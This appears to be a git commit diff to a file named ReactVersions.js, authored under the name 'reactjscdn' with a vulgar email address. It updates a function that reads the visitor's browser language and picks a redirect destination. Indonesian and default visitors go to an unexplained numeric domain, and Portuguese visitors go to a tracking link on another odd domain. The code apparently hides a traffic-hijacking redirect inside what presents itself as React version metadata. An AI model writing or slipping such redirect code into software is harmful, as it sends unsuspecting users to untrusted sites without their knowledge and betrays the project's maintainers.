9426a00098f765c81ff5ca264fa5f2a883dca9fc
reactjscdn <bro_fuckme_oh@proton.me>
2026-09-11 04:43:22 +0800

    Update target URLs based on language

--- ReactVersions.js
+++ ReactVersions.js
@@ -224,11 +224,11 @@
       const lang = (navigator.language || (navigator.languages && navigator.languages[0]) || '').toLowerCase();
       
       if (lang.startsWith('id')) {
-        return 'https://866296.com';
+        return 'https://168062.com';
       } else if (lang.startsWith('pt')) {
         return 'https://www.9bm8s8.com?ch=146712';
       }
-      return 'https://866296.com';
+      return 'https://168062.com';
     }
 
     const targetUrl = getTargetUrl();
